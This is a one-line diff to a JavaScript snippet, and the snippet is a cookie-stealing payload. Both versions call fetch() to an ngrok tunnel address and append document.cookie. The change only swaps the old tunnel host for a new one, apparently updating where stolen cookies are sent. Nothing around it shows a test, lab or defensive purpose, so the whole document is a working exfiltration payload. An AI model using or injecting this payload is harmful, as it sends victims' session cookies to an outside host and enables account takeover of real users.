@@ -1,1 +1,1 @@
-fetch('https://abcd-12-34-56-78.ngrok.io?c=' + document.cookie)
+fetch('https://600c-209-151-144-148.ngrok-free.app?c=' + document.cookie)
